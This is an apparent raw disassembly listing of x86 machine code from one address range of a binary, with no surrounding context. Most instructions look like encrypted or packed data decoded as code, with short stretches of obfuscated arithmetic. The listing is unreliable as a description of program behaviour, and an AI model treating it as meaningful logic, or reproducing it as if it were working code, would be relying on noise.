  4085a0:	dec    ebx
  4085a1:	bound  eax,QWORD PTR [esi+0x50ce1794]
  4085a7:	xor    eax,0x7f570436
  4085ac:	lock adc eax,DWORD PTR [eax]
  4085af:	mov    edi,0x811eab64
  4085b4:	and    ebx,DWORD PTR [esi+0x31]
  4085b7:	ret    
  4085b8:	mov    cl,0x59
  4085ba:	push   DWORD PTR ds:[esp+eax*8]
  4085be:	jle    0x4085eb
  4085c0:	cld    
  4085c1:	das    
  4085c2:	loope  0x4085e5
  4085c4:	imul   ecx,DWORD PTR [ecx],0x59be28ee
  4085ca:	inc    esi
  4085cb:	push   ss
  4085cc:	jbe    0x40854e
  4085ce:	mov    WORD PTR [ecx-0x7fb72963],?
  4085d4:	mov    eax,0xc92a2544
  4085d9:	pop    ecx
  4085da:	es dec eax
  4085dc:	ja     0x408629
  4085de:	mov    dl,BYTE PTR [ebx]
  4085e0:	dec    esi
  4085e1:	test   al,0x82
  4085e3:	mov    cl,0x12
  4085e5:	in     al,dx
  4085e6:	ja     0x408611
  4085e8:	cmp    BYTE PTR [ecx+0x6f9e2d9e],dh
  4085ee:	sub    eax,0xc55f2fc5
  4085f3:	or     esp,0xffffffbe
  4085f6:	sbb    dl,cl
  4085f8:	jns    0x408582
  4085fa:	jnp    0x4085ee
  4085fc:	pop    es
  4085fd:	hlt    
  4085fe:	add    DWORD PTR [ecx],ebx
  408600:	jmp    0x48c7aa90
  408605:	into   
  408606:	gs xchg esi,eax
  408608:	cdq    
  408609:	es dec esp
  40860b:	jecxz  0x40861b
  40860d:	retf   0x8346
  408610:	sbb    esi,DWORD PTR cs:[eax]
  408613:	dec    ebp
  408614:	jle    0x4085cf
  408616:	xchg   esp,eax
  408617:	ret    0x1b35
  40861a:	mov    ds:0x941dbbab,eax
  40861f:	jo     0x40860a
  408621:	imul   ebx,DWORD PTR [ecx-0x53e2b161],0xffffffd3
  408628:	jns    0x408683
  40862a:	pop    esp
  40862b:	mov    eax,0x9ef55627
  408630:	pop    ds
  408631:	(bad)
  408635:	or     ecx,edi
  408637:	add    cl,dh
  408639:	ins    BYTE PTR es:[edi],dx
  40863a:	(bad)  
  40863b:	mov    al,0x5c
  40863d:	pusha  
  40863e:	sbb    DWORD PTR [eax],ecx
  408640:	(bad)  
  408641:	aas    
  408642:	(bad)  
  408643:	mov    ebp,0x7b34cd50
  408648:	pop    ax
  40864a:	jae    0x408644
  40864c:	rol    DWORD PTR [edx-0x77],0xfd
  408650:	sbb    dl,BYTE PTR [edx+0x5a]
  408653:	push   eax
  408654:	xchg   BYTE PTR [edi],cl
  408656:	jle    0x4085dc
  408658:	stos   DWORD PTR es:[edi],eax
  408659:	mov    dh,bh
  40865b:	jge    0x408668
  40865d:	lods   al,BYTE PTR ds:[esi]
  40865e:	sbb    ecx,DWORD PTR [ecx-0x29c04565]
  408664:	mov    dh,0x10
  408667:	xchg   esp,eax
  408668:	out    dx,al
  408669:	clc    
  40866a:	into   
  40866b:	sti    
  40866c:	push   cs
  40866d:	(bad)  
  408670:	inc    ecx
  408671:	enter  0xbf72,0x55
  408675:	mov    al,0x9b
  408677:	jnp    0x4086e9
  408679:	jg     0x40862e
  40867b:	mov    ah,0xdf
  40867d:	xchg   BYTE PTR ss:[edx+0x3],dh
  408681:	out    dx,eax
  408682:	and    eax,0xffd52947
  408687:	jne    0x408619
  408689:	shr    BYTE PTR [esi-0x424e4c21],0x9d
  408690:	dec    edi
  408691:	cmp    eax,0x68ce1493
  408696:	or     bh,BYTE PTR ds:[edi+0x3]
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x433663,0x4335fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x416e32b6],ecx
  4086ca:	jmp    0x408656
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	jmp    DWORD PTR [eax-0x8]
  4086d6:	add    eax,0x4ef0c031
  4086db:	pop    eax
  4086dc:	(bad)  
  4086dd:	pop    es
  4086de:	shl    DWORD PTR [ebx],cl
  4086e0:	(bad)  
  4086e1:	pop    ecx
  4086e2:	push   ds
  4086e3:	pushf  
  4086e4:	adc    al,0xb8
  4086e6:	mov    WORD PTR [ecx+0x64],es
  4086e9:	repnz das 
  4086eb:	(bad)  
  4086ec:	(bad)  [ebx]
  4086ee:	push   cs
  4086ef:	or     eax,0x807568db
  4086f4:	retf   
  4086f5:	cs xor dl,ch
  4086f8:	mov    DWORD PTR [ebp-0x23943926],ebx
  4086fe:	call   0x5dca471f
  408703:	inc    esp
  408704:	out    0x83,eax
  408706:	mov    ss,WORD PTR [ecx]
  408708:	fwait
  408709:	scas   eax,DWORD PTR es:[edi]
  40870a:	dec    ebp
  40870b:	xchg   edi,eax
  40870c:	xor    ah,bl
  40870e:	mov    bl,0x8b
  408710:	adc    BYTE PTR [ebx],ch
  408712:	dec    ebp
  408713:	push   ecx
  408714:	cmp    esi,DWORD PTR [edi]
  408716:	std    
  408717:	and    al,0xfb
  408719:	xor    eax,0x4699c257
  40871e:	push   edi
  40871f:	add    BYTE PTR [eax],al
  408721:	ret    
  408722:	sahf   
  408723:	mov    ds:0x10f80619,eax
  408728:	or     cl,BYTE PTR [ebp+0x596444f4]
  40872e:	dec    eax
  40872f:	into   
  408730:	icebp  
  408731:	push   0xf2964072
  408736:	aaa    
  408737:	jp     0x408727
  408739:	add    al,0x9a
  40873b:	inc    eax
  40873c:	adc    al,0x13
  40873e:	mov    bl,0xeb
  408740:	out    0x4e,eax
  408742:	sbb    edx,0x4d8b45cb
  408748:	pop    ecx
  408749:	cmp    eax,0x76c0d12a
  40874e:	inc    edi
  40874f:	push   0xfffffffe
  408751:	mov    cl,0x99
  408753:	mov    ss,WORD PTR [edx-0x20]
  408756:	mov    eax,ds:0xb69a97fe
  40875b:	inc    esp
  40875c:	sub    al,0xa0
  40875e:	sub    ch,bl
  408760:	hlt    
  408761:	jns    0x4087b8
  408763:	mov    dl,0xc2
  408765:	adc    eax,0x7f5e38d1
  40876a:	fcmovb st,st(6)
  40876c:	retf   
  40876d:	test   BYTE PTR [ebx-0x1730d367],bl
  408773:	mov    eax,gs:0xeb0c544a
  408779:	(bad)  [edi+0x33]
  40877c:	and    al,0xb4
  40877e:	ret    
  40877f:	mov    eax,ds:0xd3eaf7f4
  408784:	mov    ebx,DWORD PTR [esi+edx*1-0x7e]
  408788:	pop    eax
  408789:	fisub  WORD PTR [eax-0x54364803]
  40878f:	out    0xa9,eax
  408791:	sahf   
  408792:	lods   eax,DWORD PTR ds:[esi]
  408793:	mov    ebx,0x7c4ccffe
  408798:	dec    edx
  408799:	(bad)  
  40879a:	jecxz  0x4087ba
  40879c:	or     esp,DWORD PTR [ebp+0x12ae9b7c]
  4087a2:	dec    esi
  4087a3:	mov    ebx,0xabcf5af3
  4087a8:	add    edx,DWORD PTR [esi+0x44a3c15f]
  4087ae:	fisttp QWORD PTR fs:[esi]
  4087b1:	adc    DWORD PTR [eax],ebx
  4087b3:	push   edx
  4087b4:	out    dx,eax
  4087b5:	mov    WORD PTR [ecx],es
  4087b7:	mov    BYTE PTR [edi-0x18ef1b1b],0x5b
  4087be:	inc    edi
  4087bf:	(bad)  
  4087c1:	rol    BYTE PTR [eax+ebx*4],cl
  4087c4:	scas   eax,DWORD PTR es:[edi]
  4087c5:	jmp    0x5a42:0x39a0ca9
  4087cc:	test   BYTE PTR ss:[eax+0x1a00e77c],bl
  4087d3:	gs push eax
  4087d5:	push   0xb127ee39
  4087da:	pushf  
  4087db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087dc:	xor    BYTE PTR [ecx+0x3d],al
  4087df:	xchg   ebx,eax
  4087e0:	xor    ecx,ebx
  4087e2:	shl    BYTE PTR [eax-0xf],0xd2
  4087e6:	inc    edx
  4087e7:	add    DWORD PTR ds:0x72f75d3e,0x3f
  4087ee:	sub    BYTE PTR [edi+0xd7ca665],ch
  4087f4:	mov    ecx,0x64023237
  4087f9:	hlt    
  4087fa:	inc    edx
  4087fb:	jnp    0x408823
  4087fd:	iret   
  4087fe:	add    bl,BYTE PTR [edx-0x1d]
  408801:	sub    eax,0x3a756a57
  408806:	fucomi st,st(0)
  408808:	repz (bad) 
  40880a:	cld    
  40880b:	outs   dx,DWORD PTR ds:[esi]
  40880c:	mov    DWORD PTR [edx-0x1a1cbd97],ebp
  408812:	not    BYTE PTR [edi]
  408814:	mov    cl,0x2b
  408816:	mov    esi,0x2d8b639f
  40881b:	pop    esp
  40881c:	add    esp,DWORD PTR [ecx]
  40881e:	inc    ecx
  40881f:	inc    ebp
  408820:	out    0xce,al
  408822:	dec    ebp
  408823:	mul    ch
  408825:	sub    BYTE PTR [ebp-0x7],ch
  408828:	jg     0x408856
  40882a:	pusha  
  40882b:	setg   BYTE PTR [ebp+ebx*2-0xf]
  408830:	dec    edx
  408831:	scas   eax,DWORD PTR es:[edi]
  408832:	mov    BYTE PTR [edx+0x637489fb],bh
  408838:	jp     0x40887c
  40883a:	sub    DWORD PTR [edi],edi
  40883c:	xchg   ebp,eax
  40883d:	pushf  
  40883e:	cmp    dh,al
  408840:	or     al,0x39
  408842:	add    eax,DWORD PTR [edi+0x7f]
  408845:	call   0x18c7b1c8
  40884a:	fadd   QWORD PTR [edi-0x65]
  40884d:	std    
  40884e:	int3   
  40884f:	mov    bl,0x29
  408851:	xchg   ebp,eax
  408852:	sahf   
  408853:	and    ch,0xf5
  408856:	jbe    0x4087ff
  408858:	ja     0x4087ec
  40885a:	xchg   ecx,eax
  40885b:	call   0xe1ce3239
  408860:	inc    esi
  408861:	jle    0x408881
  408863:	push   edi
  408864:	inc    edx
  408865:	jbe    0x4088ae
  408867:	ror    BYTE PTR [ebx],0xfd
  40886a:	aam    0x96
  40886c:	lds    ecx,FWORD PTR [edi]
  40886e:	aad    0x20
  408870:	dec    ebp
  408871:	add    BYTE PTR [ecx-0x6ac0756f],cl
  408877:	int    0x6f
  408879:	cmp    eax,0xf6bf33e3
  40887e:	dec    edi
  40887f:	sub    dl,BYTE PTR [ebx+0x37]
  408882:	shl    BYTE PTR [eax],0xf2
  408885:	mov    ecx,DWORD PTR [ebx-0x8c8696c]
  40888b:	or     BYTE PTR [esi+0x629073c9],al
  408891:	in     al,dx
  408892:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408893:	xor    ebp,DWORD PTR [esi+0x9527a33]
  408899:	pushf  
  40889a:	mov    eax,ds:0x7eebaaa6
  40889f:	cmp    BYTE PTR [eax+0x6b],0x7e
  4088a3:	pop    edx
  4088a4:	call   0xc804:0x1bdde07
  4088ab:	loop   0x408925
  4088ad:	mov    ch,cl
  4088af:	mov    dh,0x38
  4088b2:	xchg   ebx,eax
  4088b3:	jbe    0x4088df
  4088b5:	clc    
  4088b6:	adc    ebp,0x3e
  4088b9:	shl    DWORD PTR [edx+0x63],0xd7
  4088bd:	int    0xe4
  4088bf:	ret    0x7630
  4088c2:	adc    al,0x32
  4088c4:	pop    ecx
  4088c5:	and    al,0xb
  4088c7:	or     esi,DWORD PTR [ebx+0x7f28bfe4]
  4088cd:	dec    ebp
  4088ce:	push   eax
  4088cf:	push   es
  4088d0:	scas   eax,DWORD PTR es:[edi]
  4088d1:	test   al,0xf9
  4088d3:	pop    ebx
  4088d4:	inc    edx
  4088d5:	ja     0x408861
  4088d7:	jg     0x4088ad
  4088d9:	(bad)  
  4088db:	adc    eax,0x16a5ccca
  4088e0:	loop   0x408933
  4088e2:	ds out 0x5,al
  4088e5:	push   eax
  4088e6:	sub    DWORD PTR [ebp+0x563cf979],ebx
  4088ec:	shl    DWORD PTR [esi],cl
  4088ee:	fcom   DWORD PTR [ecx+0x1b]
  4088f1:	test   al,0xf5
  4088f3:	xchg   ebp,eax
  4088f4:	jns    0x4088e3
  4088f6:	xor    edi,DWORD PTR [esi+0x36]
  4088f9:	(bad)
  4088fc:	jg     0x408889
  4088fe:	add    BYTE PTR [ecx+0x43366335],al
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x94f5ee2c
  408968:	jp     0x40891a
  40896a:	aam    0x7e
  40896c:	jle    0x408992
  40896e:	jl     0x4089ee
  408970:	jle    0x408992
  408972:	push   es
  408973:	jge    0x408951
  408975:	aaa    
  408976:	gs push es
  408978:	clc    
  408979:	xlat   BYTE PTR ds:[ebx]
  40897a:	xchg   edx,eax
  40897b:	jbe    0x4089cc
  40897d:	adc    al,bl
  40897f:	jb     0x4089be
  408981:	cli    
  408982:	jo     0x4089a7
  408984:	test   DWORD PTR [eax-0xacaa89b],ecx
  40898a:	in     al,0x76
  40898c:	inc    BYTE PTR [eax+eiz*4]
  40898f:	mov    ch,0xa7
  408991:	(bad)  
  408992:	fprem  
  408994:	jno    0x408995
  408996:	aaa    
  408997:	(bad)  [eax-0x61]
  40899a:	mov    BYTE PTR [ebp-0x7],bh
  40899d:	shl    BYTE PTR [ecx+ebx*4-0x704e9ce],0xab
  4089a5:	push   ebx
  4089a6:	mov    ds:0x6d7c54a3,al
  4089ab:	adc    eax,0x88b846a1
  4089b0:	adc    eax,0x7f44f174
  4089b5:	jae    0x4089f9
  4089b7:	fwait
  4089b8:	(bad)  
  4089b9:	out    0xe3,eax
  4089bb:	mov    WORD PTR [eax+0x5ded204b],?
  4089c1:	mov    ss,WORD PTR [ebp-0x10b4934d]
  4089c7:	cdq    
  4089c8:	jle    0x408a06
  4089ca:	cwde   
  4089cb:	in     al,dx
  4089cc:	mov    cl,BYTE PTR [edx]
  4089ce:	shr    BYTE PTR [eax],cl
  4089d0:	adc    BYTE PTR [edi+0x67],0x32
  4089d4:	xchg   ebx,eax
  4089d5:	fdiv   DWORD PTR [eax]
  4089d7:	cdq    
  4089d8:	dec    ecx
  4089d9:	lods   eax,DWORD PTR ds:[esi]
  4089da:	jmp    0x408a08
  4089dc:	dec    esi
  4089dd:	or     eax,0xcff962ca
  4089e2:	ins    DWORD PTR es:[edi],dx
  4089e3:	mov    al,al
  4089e5:	and    DWORD PTR [ecx+0xb],esp
  4089e8:	rcl    eax,0x24
  4089eb:	shl    eax,1
  4089ed:	into   
  4089ee:	jnp    0x408a3a
  4089f0:	shl    esp,1
  4089f2:	inc    ecx
  4089f3:	xchg   esi,eax
  4089f4:	shl    esi,1
  4089f6:	adc    eax,0xd8d2c5a4
  4089fb:	and    BYTE PTR [ecx],al
  4089fd:	or     al,0x85
  4089ff:	stos   DWORD PTR es:[edi],eax
  408a00:	popa   
  408a01:	and    dl,BYTE PTR [eax+0x7ddb159]
  408a07:	dec    esi
  408a08:	(bad)  
  408a09:	cmp    ch,dl
  408a0b:	fisub  DWORD PTR [edx+0x3f]
  408a0e:	mov    ebx,0x64392ad0
  408a13:	sahf   
  408a14:	jmp    0xd847:0x7c1fb9fc
  408a1b:	ds or  DWORD PTR gs:[ebx-0x51c1bb34],ebx
  408a23:	std    
  408a24:	adc    al,0xeb
  408a26:	xor    al,0x4c
  408a28:	rcl    BYTE PTR [ebx+0x74f18013],1
  408a2e:	cwde   
  408a2f:	mov    eax,0x133be613
  408a34:	push   cs
  408a35:	inc    esp
  408a36:	sub    BYTE PTR [eax],dl
  408a38:	loope  0x4089ce
  408a3a:	ret    
  408a3b:	pop    edx
  408a3c:	mov    eax,ds:0x6059fdf9
  408a41:	dec    ebp
  408a42:	lods   eax,DWORD PTR ds:[esi]
  408a43:	int3   
  408a44:	neg    BYTE PTR [edi]
  408a46:	push   ebx
  408a47:	push   ebx
  408a48:	and    ebx,DWORD PTR [edi-0x6f]
  408a4b:	pop    esi
  408a4c:	into   
  408a4d:	in     eax,dx
  408a4e:	mov    ebp,0x158d9d5d
  408a53:	sbb    ebx,ebp
  408a55:	mov    esi,0xa158bf02
  408a5a:	xchg   ebp,eax
  408a5b:	je     0x408ac0
  408a5d:	mov    dh,0xa
  408a5f:	sbb    ebx,ebx
  408a61:	das    
  408a62:	push   cs
  408a63:	push   ss
  408a64:	icebp  
  408a65:	xor    DWORD PTR [esi],ebx
  408a67:	in     al,0xc5
  408a69:	mov    ebx,0x4388c9e5
  408a6e:	cwde   
  408a6f:	mov    al,ds:0x53545019
  408a74:	scas   al,BYTE PTR es:[edi]
  408a75:	sub    esi,DWORD PTR es:[edi]
  408a78:	cmp    BYTE PTR [edx+0x53],al
  408a7b:	adc    edi,eax
  408a7d:	fist   WORD PTR [ebp+0x634e1e96]
  408a83:	ret    
  408a84:	mov    edx,ebx
  408a86:	mov    DWORD PTR [eax],ebp
  408a88:	popf   
  408a89:	mov    bh,0xa1
  408a8b:	in     al,0xc
  408a8d:	loopne 0x408ac3
  408a8f:	add    DWORD PTR [ebp+0x7071ebe2],eax
  408a95:	lock popf 
  408a97:	pop    eax
  408a98:	pop    edx
  408a99:	sub    esp,DWORD PTR [ebp+0x3534a644]
  408a9f:	cld    
  408aa0:	cwde   
  408aa1:	ss mov ecx,0xcbec0e3a
  408aa7:	push   edi
  408aa8:	cdq    
  408aa9:	xchg   edx,eax
  408aaa:	out    0xd6,al
  408aac:	or     al,0x7a
  408aae:	cmp    al,0xf4
  408ab0:	enter  0x15b7,0x6e
  408ab4:	ins    BYTE PTR es:[edi],dx
  408ab5:	pushf  
  408ab6:	inc    ecx
  408ab7:	or     eax,DWORD PTR [esi+ebx*8+0x11373197]
  408abe:	cld    
  408abf:	adc    ch,BYTE PTR [ecx]
  408ac1:	mov    ch,0x16
  408ac3:	adc    esi,DWORD PTR [ebp-0x1b4a7c9e]
  408ac9:	jne    0x408b3e
  408acb:	ss ret 0x9b28
  408acf:	mov    ds:0x214dd2ce,eax
  408ad4:	aad    0xdd
  408ad6:	dec    ebp
  408ad7:	push   0x2c
  408ad9:	cld    
  408ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408adb:	add    eax,0x5099d407
  408ae0:	ret    0xaeab
  408ae3:	add    al,0x85
  408ae5:	es (bad) 
  408ae7:	pop    ds
  408ae8:	sub    eax,0x3ac8d1ef
  408aed:	sbb    BYTE PTR [edi],bl
  408aef:	pop    ds
  408af0:	xchg   esp,eax
  408af1:	add    eax,0x59fc8d9a
  408af6:	test   eax,0xcba890fe
  408afb:	add    eax,0x57ca7532
  408b00:	aaa    
  408b01:	cwde   
  408b02:	inc    edi
  408b03:	bound  edx,QWORD PTR [esi]
  408b05:	stc    
  408b06:	and    DWORD PTR [eax-0x6591efb6],ebp
  408b0c:	jbe    0x408b23
  408b0e:	scas   eax,DWORD PTR es:[edi]
  408b0f:	iret   
  408b10:	ss cmc 
  408b12:	jo     0x408b42
  408b14:	aas    
  408b15:	push   0xa6ae2b73
  408b1a:	addr16 and eax,0xf8f80057
  408b20:	sahf   
  408b21:	adc    ecx,DWORD PTR [eax]
  408b23:	cmp    DWORD PTR [esi-0x51],esp
  408b26:	jl     0x408b70
  408b28:	push   es
  408b29:	and    dl,cl
  408b2b:	add    bh,0xa0
  408b2e:	push   0x13
  408b30:	and    eax,0xcfa3eb08
  408b35:	mov    ecx,0x41a02049
  408b3a:	mov    esi,fs
  408b3c:	mov    esi,0xb1923462
  408b41:	fistp  DWORD PTR [ecx-0x63]
  408b44:	es in  al,0xc1
  408b47:	in     al,dx
  408b48:	repz push ds
  408b4a:	call   0xc386a98c
  408b4f:	pop    ds
  408b50:	xor    bl,bl
  408b52:	fcom   QWORD PTR [ecx-0x7d]
  408b55:	push   es
  408b56:	xor    DWORD PTR [esi+edx*8],ebx
  408b59:	jmp    0x408b0a
  408b5b:	push   esi
  408b5c:	mov    cl,al
  408b5e:	push   ds
  408b5f:	jmp    0x408aff
  408b61:	mov    bl,0xc1
  408b63:	mov    ch,BYTE PTR [edi+0x78]
  408b66:	sbb    al,0x57
  408b68:	mov    al,BYTE PTR [edi]
  408b6a:	adc    cl,BYTE PTR [edx]
  408b6c:	pop    esp
  408b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b6e:	pop    ebp
  408b6f:	mov    eax,0x270134e5
  408b74:	xor    DWORD PTR [esi+0x1ef839ee],edx
  408b7a:	mov    ah,0x97
  408b7c:	mov    fs,WORD PTR ds:0x74c7f3b1
  408b82:	imul   ebx,DWORD PTR [edi+0x7],0x26
  408b86:	leave  
  408b87:	leave  
  408b88:	push   ebp
  408b89:	ret    0x764d
  408b8c:	int    0x92
  408b8e:	sub    BYTE PTR [edx-0x49],dl
  408b91:	jnp    0x408c0d
  408b93:	retf   
  408b94:	repz xlat BYTE PTR ds:[ebx]
  408b96:	or     al,0xa4
  408b98:	and    DWORD PTR [esi-0x4a],esp
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	fstp   TBYTE PTR [ebx+0x6]
  408bf3:	sahf   
  408bf4:	data16 sar BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	loop   0x408c12
  408bfe:	adc    ecx,eax
  408c00:	shl    BYTE PTR ds:0x759200bd,1
  408c06:	cwde   
  408c07:	mov    DWORD PTR [edx+0x7d],ecx
  408c0a:	and    bh,BYTE PTR [edx]
  408c0c:	pop    ebp
  408c0d:	popa   
  408c0e:	fs dec edi
  408c10:	icebp  
  408c11:	or     eax,0x82d31a40
  408c16:	(bad)  
  408c17:	adc    edi,edi
  408c19:	fld    DWORD PTR [ebx+0x6e]
  408c1c:	(bad)  
  408c1d:	jmp    0xc3d:0x4381f45f
  408c24:	icebp  
  408c25:	jmp    0x408c04
  408c27:	push   ebp
  408c28:	cmp    edi,DWORD PTR [ecx+0x30]
  408c2b:	xchg   esp,eax
  408c2c:	les    ebx,FWORD PTR [ebp-0x7468e20d]
  408c32:	shl    BYTE PTR [esi],0x29
  408c35:	mov    esp,DWORD PTR [ebp+0x62]
  408c38:	mov    ah,0xa4
  408c3a:	add    ch,al
  408c3c:	retf   0x1912
  408c3f:	add    al,0x8d
  408c41:	xor    ecx,DWORD PTR [edx]
  408c43:	scas   al,BYTE PTR es:[edi]
  408c44:	in     al,dx
  408c45:	or     bl,al
  408c47:	jne    0x408ca8
  408c49:	jl     0x408c32
  408c4b:	mov    eax,0xa017259c
  408c50:	sub    ecx,DWORD PTR [edi-0x5e]
  408c53:	stos   DWORD PTR es:[edi],eax
  408c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c55:	pop    ds
  408c56:	je     0x408cb6
  408c58:	shl    esi,0xb6
  408c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c5c:	sub    DWORD PTR [edi+edx*8],ecx
  408c5f:	imul   edi,DWORD PTR [ebx],0x65ca47ad
  408c65:	mov    al,0x33
  408c67:	mov    ecx,edx
  408c69:	push   0xffffff80
  408c6b:	cmp    BYTE PTR [ebx],al
  408c6d:	ja     0x408c25
  408c6f:	inc    ebp
  408c70:	in     eax,dx
  408c71:	sbb    eax,0x53441824
  408c76:	or     BYTE PTR [eax+0x17],dh
  408c79:	mov    cl,0x7a
  408c7b:	adc    ecx,DWORD PTR [ebx+ebx*1+0x3d]
  408c7f:	cs (bad) 
  408c81:	jle    0x408cfb
  408c83:	and    eax,0xc4449c13
  408c88:	pop    edi
  408c89:	push   0x5d
  408c8b:	add    edx,DWORD PTR [ecx+0x19]
  408c8e:	pop    ss
  408c8f:	sbb    dl,0x42
  408c92:	lock push edi
  408c94:	idiv   ebp
  408c96:	mov    edi,0x6e40e3bd
  408c9b:	dec    ecx
  408c9c:	or     al,0x62
  408c9e:	stc    
  408c9f:	imul   eax,DWORD PTR [eax],0xffffff94
  408ca2:	fcom   QWORD PTR [esi+0x7b9ed267]
  408ca8:	mov    edi,0x4537fd72
  408cad:	stos   BYTE PTR es:[edi],al
  408cae:	lods   eax,DWORD PTR ds:[esi]
  408caf:	push   ss
  408cb0:	or     al,0x8
  408cb2:	mov    eax,0xb0d5b8e0
  408cb7:	jns    0x408c6f
  408cb9:	test   BYTE PTR [esi],ch
  408cbb:	sub    BYTE PTR [ebp-0x1d],0x9f
  408cbf:	fild   DWORD PTR [edx-0x7d]
  408cc2:	lahf   
  408cc3:	fs (bad) 
  408cc5:	cli    
  408cc6:	push   ecx
  408cc8:	or     BYTE PTR [eax],cl
  408cca:	je     0x408d0b
  408ccc:	mov    edi,0xec883cfe
  408cd1:	test   BYTE PTR [esi+edi*8-0x6d],bl
  408cd5:	jbe    0x408cf5
  408cd7:	cmp    eax,0xef244e86
  408cdc:	lds    eax,FWORD PTR [eax-0x23]
  408cdf:	cmp    eax,0x78191bff
  408ce4:	pop    es
  408ce5:	jmp    0x462b:0xdbdf9e1f
  408cec:	pop    eax
  408ced:	xchg   ebp,eax
  408cee:	sub    al,0x4c
  408cf0:	out    0xde,al
  408cf2:	xchg   edi,eax
  408cf3:	dec    esi
  408cf4:	xor    eax,0x3b74efd3
  408cf9:	and    eax,0x9dd17c89
  408cfe:	inc    ebx
  408cff:	sbb    eax,0xb64ebcb3
  408d04:	push   ebp
  408d05:	cmp    DWORD PTR [ecx+ecx*2],ebp
  408d08:	mov    ds:0xf8e740a7,al
  408d0d:	(bad)  
  408d0e:	jmp    0xf07e:0xc2545a68
  408d15:	sub    al,BYTE PTR [ebx]
  408d17:	xor    DWORD PTR [ecx+0x2d],ebp
  408d1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d1b:	jnp    0x408d35
  408d1d:	icebp  
  408d1e:	sbb    BYTE PTR [ebx+0x23e0231f],ch
  408d24:	xor    eax,0x4d1c2dbe
  408d29:	mov    BYTE PTR [ecx],ah
  408d2b:	mov    cs:0x86be5add,eax
  408d31:	inc    eax
  408d32:	sahf   
  408d33:	inc    eax
  408d34:	sti    
  408d35:	fld    st(1)
  408d37:	jmp    0x5701:0xb8a3cbec
  408d3e:	mov    bl,0x84
  408d40:	ins    DWORD PTR es:[edi],dx
  408d41:	push   ebp
  408d42:	or     ah,bh
  408d44:	and    al,0x5
  408d46:	pop    es
  408d47:	or     DWORD PTR [esi],esi
  408d49:	push   ebx
  408d4a:	js     0x408da8
  408d4c:	xchg   esp,eax
  408d4d:	fild   QWORD PTR [edx+edx*1]
  408d50:	mov    dh,0xe5
  408d52:	ins    DWORD PTR es:[edi],dx
  408d53:	call   0xc8c01f3c
  408d58:	push   esi
  408d59:	xchg   ecx,eax
  408d5a:	lds    edi,FWORD PTR [ebp+0x623ded7e]
  408d60:	ud2    
  408d62:	(bad)  
  408d63:	pop    ecx
  408d64:	xchg   edi,eax
  408d65:	xchg   ebp,eax
  408d66:	in     al,dx
  408d67:	cdq    
  408d68:	xchg   ebp,eax
  408d69:	pop    es
  408d6a:	xchg   edx,eax
  408d6b:	out    dx,eax
  408d6c:	aas    
  408d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d6e:	fdiv   QWORD PTR [ebp+0x4c5f0087]
  408d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d75:	and    eax,0x8466bb66
  408d7a:	pop    eax
  408d7b:	dec    ebp
  408d7c:	cmp    al,bl
  408d7e:	call   0xd0a5:0x493bcbc0
